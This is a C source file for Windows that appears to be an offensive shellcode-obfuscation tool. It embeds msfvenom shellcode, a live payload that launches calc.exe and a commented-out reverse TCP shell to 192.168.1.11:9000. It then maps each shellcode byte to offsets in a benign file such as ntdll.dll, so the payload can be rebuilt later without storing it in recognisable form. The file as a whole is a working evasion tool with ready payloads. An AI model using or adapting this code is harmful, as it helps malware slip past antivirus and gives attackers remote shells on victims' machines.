#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Zydis/Zydis.h>
#include <inttypes.h>

// ------------------- DO NOT EDIT ABOVE HERE -------------------------------------------- //
// Insert the payload generated by msfvenom into a const unsigned char Payload[] as per below

//msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
const unsigned char Payload[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

//msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=9000 -f csharp
//const unsigned char Payload[] = {
//0xfc,0x48,0x83,0xe4,0xf0,0xe8,
//0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
//0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
//0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
//0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
//0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
//0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
//0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
//0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
//0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
//0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
//0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
//0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
//0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
//0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
//0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
//0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
//0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
//0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
//0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x23,0x28,
//0xc0,0xa8,0x01,0x0b,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
//0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
//0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
//0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,
//0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,
//0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,
//0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,
//0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
//0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,
//0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,
//0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,
//0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,
//0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
//0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,
//0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,
//0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,
//0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
//0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
//0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5
//};

// ------------------- DO NOT EDIT BELOW HERE -------------------------------------------- //


BOOL BinToBytes(IN PBYTE filePath, OUT SIZE_T* sFileSize, OUT PBYTE* buffer) {

    FILE* file = NULL;
    SIZE_T bytesRead = NULL;  //for comparing to fileSize to ensure all bytes are read
    SIZE_T fileSize = NULL;   //size of file being read
    PBYTE fileBuffer = NULL;  //buffer to hold the bytes

    //open file
    file = fopen(filePath, "rb");
    if (!file) {
        printf("[!] Error opening file. fopen failed with error %d\n", GetLastError());
        return FALSE;
    }

    //get size of file
    fseek(file, 0, SEEK_END);  //put file seeker at end of file
    fileSize = ftell(file);    //ftell returns the current position of the seeker in bytes. As it is at the end it tells us the size of the file
    rewind(file);              //put seeker back to the beginning in preparation for fread below
    printf("[i] The size of %s is: %zu bytes\n\n", filePath, fileSize);

    //write bytes to buffer
    fileBuffer = malloc(fileSize);
    bytesRead = fread(fileBuffer, 1, fileSize, file);
    if (bytesRead != fileSize) {
        printf("[!] Error reading bytes from file. fread returned error %d\n", GetLastError());
        fclose(file);
        free(buffer);
        return FALSE;
    }

    *sFileSize = fileSize;
    *buffer = fileBuffer;

    //cleanup
    if (file) {
        fclose(file);
    }

    return TRUE;
}

int main(int argc, char* argv[]) {

    if (argc < 2) {
        printf("\nUsage: constructor.exe [path to target file]\nExample: constructor.exe C:\\Windows\\System32\\ntdll.dll\n");
        return -1;
    }

    PBYTE bFilePath = argv[1];                            //stores the path to the target file
    PBYTE bFileBuffer = NULL;                             //stores the bytes of the target file
    SIZE_T sFileSize = NULL;                              //size of target file

    //Get all the bytes of the target file
    BinToBytes(bFilePath, &sFileSize, &bFileBuffer);

    //for iterating through the Payload array. Keeps track of where we are in the payload array
    int payloadPosition = 0;

    //new array to store positions
    printf("[i] Size of payload is: %d bytes\n", sizeof(Payload));
    unsigned int Position[sizeof(Payload)];

    //iterate through the bytes of the target file and compare them to the byte we want in the shellcode
    //payloadPosition keeps track of where we are in the payload array
    //i is reset to the beginning every time we successfully find a byte
    for (long i = 0; i < sFileSize; i++) {

        if (bFileBuffer[i] == Payload[payloadPosition] && payloadPosition < sizeof(Payload)) {
            Position[payloadPosition] = i;
            //uncomment this if you want to print the original payload bytes
            //printf("%02x ,", bFileBuffer[i]);
            payloadPosition++;
            i = 0;
        }

    }

    //error handling if it is not able to find a particular byte of the shellcode in the target program
    if (payloadPosition < sizeof(Payload)) {
        printf("\n\nUnable to find byte %02x in file %s\n", Payload[payloadPosition], bFilePath);
        return -1;
    }

    //print our array with the position of each byte in the target program
    printf("\n\nconst unsigned int Positions[] = {\t");

    for (int i = 0; i < (sizeof(Position) / sizeof(Position[0])); i++) {

        //make the printing prettier
        if (i == sizeof(Position) / sizeof(Position[0]) - 1) {
            printf("%d", Position[i]);
            continue;
        }

        if (i != 0 && i % 16 != 0) {
            printf("%d, ", Position[i]);
            continue;
        }

        if (i % 16 == 0) {
            printf("\n\t%d, ", Position[i]);
            continue;
        }
    }

    printf("\n};\n\n");

    return 0;
}